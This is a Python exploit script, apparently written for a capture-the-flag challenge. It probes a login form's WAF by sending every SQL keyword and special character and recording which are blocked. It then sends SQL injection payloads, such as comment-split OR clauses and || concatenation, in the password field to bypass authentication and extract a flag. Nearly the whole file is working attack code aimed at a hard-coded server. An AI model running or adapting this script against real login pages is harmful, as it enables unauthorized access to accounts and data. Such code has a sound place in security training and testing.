import requests
from bs4 import BeautifulSoup 
from colorama import Fore, Style

url = "http://185.219.81.19:9999/login"
data = {
    "username":	"admin",
    "password":	"test"
}

observed_blacklist = []
reserved_keywords = [
    "SELECT", "INSERT", "UPDATE", "DELETE", "CREATE", "DROP", "ALTER", "FROM", "WHERE", 
    "JOIN", "AND", "OR", "NOT", "NULL", "TRUE", "FALSE", "IN", "BETWEEN", "LIKE", "IS", 
    "AS", "DISTINCT", "GROUP", "HAVING", "ORDER", "LIMIT", "OFFSET", "UNION", "EXCEPT", 
    "INTERSECT", "ALL", "ANY", "ASC", "DESC", "CASE", "WHEN", "THEN", "ELSE", "END", 
    "EXPLAIN", "PRAGMA", "ATTACH", "DETACH", "BEGIN", "COMMIT", "ROLLBACK", "SAVEPOINT", 
    "RELEASE", "ROLLBACK TO", "VACUUM", "ANALYZE", "REINDEX", "RENAME", "TRIGGER", "VIEW", 
    "INDEX", "TABLE", "COLUMN", "CONSTRAINT", "PRIMARY", "FOREIGN", "CHECK", "DEFAULT", 
    "UNIQUE", "NOT NULL", "REFERENCES", "ON DELETE", "ON UPDATE", "WITHOUT", "IF", "ELSEIF", 
    "RETURN", "ABORT", "FAIL", "IGNORE", "REPLACE"
]
special_characters = [
    "||", "=", "<", "<=", ">", ">=", "<>", "+", "-", "*", "/", "(", ")", ",", ".", ":", ";", 
    "'", "\"", "*", "%", "[]", "#"
]

payload_list=[
    "test' O/**/R '1'='1",
    "test' O/**/R +'1'='1",
    "test' -", 
    "test''-", #valid
    "test'--", #banned
    "test'+||+'1'='1", 
    "test' || '1'='1",
]

def attack_user(payload):
    # hard since comments are blocked
    pass

def attack_pass(payload):
    data["password"] = payload 
    resp = requests.post(url, data=data)
    if "Произошла ошибка" in resp.text:
        print(Fore.RED+"error:"+Style.RESET_ALL, data)
    elif "Неверное имя пользователя или пароль" in resp.text:
        print(Fore.YELLOW+"wrong credentials:"+Style.RESET_ALL, data)
    elif "Запрос заблокирован WAF. Подозрительный ввод" in resp.text:
        print(Fore.RED+"blocked:"+Style.RESET_ALL, data)
        soup = BeautifulSoup(resp.text, 'html.parser')
        banned = soup.find(style='color:red;').get_text()
        observed_blacklist.append(banned)
    else:
        print(Fore.GREEN+"huh????:"+Style.RESET_ALL, data)
        soup = BeautifulSoup(resp.text, 'html.parser')
        flag = soup.find(class_='flag-text')
        return flag
    return False

def find_blacklist():
    for c in reserved_keywords + special_characters :
        attack_pass("'"+c)

find_blacklist()
# observed blacklist: ['SELECT', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'AND', 'OR', 'UNION', 'DELETE', 'UPDATE', '#', '--']
# mixed-casing not work

# custom payloads
for payload in payload_list:
    flag = attack_pass(payload)
    if flag: 
        print(flag)
        break

print("blacklist:", observed_blacklist)
